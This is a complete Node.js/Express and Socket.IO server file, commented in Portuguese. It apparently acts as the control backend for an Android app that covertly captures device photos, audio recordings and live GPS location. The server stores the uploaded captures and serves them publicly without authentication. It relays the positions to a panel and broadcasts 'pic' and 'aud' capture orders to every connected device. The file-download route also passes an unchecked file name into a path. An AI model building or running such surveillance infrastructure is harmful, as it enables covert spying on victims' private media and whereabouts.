// ================== server.js COMPLETO ==================
const express = require('express');
const http    = require('http');
const path    = require('path');
const fs      = require('fs');
const { Server } = require('socket.io');

const app  = express();
const srv  = http.createServer(app);
const io   = new Server(srv, { cors:{origin:"*"} });

const PORT = process.env.PORT || 3000;

// ---------- middleware ----------
app.use(express.json({ limit:'50mb' }));   // aceita JSON gigante (foto/áudio)
app.use(express.static('public'));         // index.html & panel.html

// ---------- rotas antigas ----------
app.get('/', (_,r)=> r.sendFile(path.join(__dirname,'public','index.html')));
app.get('/panel',(_,r)=> r.sendFile(path.join(__dirname,'public','panel.html')));

// ---------- rotas NOVAS (APK) ----------
// 1) recebe foto/áudio em base64
app.post('/pkg', (req,res)=>{
    const {id, type, base64} = req.body;          // type = 'jpg' ou '3gp'
    const fn = `dumps/${id}_${Date.now()}.${type}`;
    fs.writeFileSync(fn, Buffer.from(base64,'base64'));
    // avisa o painel
    io.emit('file', {id, url:`/d/${path.basename(fn)}`});
    res.sendStatus(200);
});
// 2) download público dos arquivos
app.get('/d/:file', (req,res)=>{
    res.sendFile(path.join(__dirname,'dumps',req.params.file));
});
// 3) recebe posição ao vivo
app.post('/pos', (req,res)=>{
    io.emit('pos', req.body);   // {lat, lon, id}
    res.sendStatus(200);
});

// ---------- websocket (painel ↔ servidor ↔ APK) ----------
io.on('connection', socket=>{
    console.log('WS conectado:', socket.id);

    // painel manda comando -> repassa para TODOS APKs
    socket.on('cmd', data=>{
        io.emit('order', data);   // data = string: 'pic' | 'aud'
    });

    socket.on('disconnect', ()=> console.log('WS off:', socket.id));
});

// ---------- start ----------
srv.listen(PORT, ()=> console.log(`Rodando na ${PORT}`));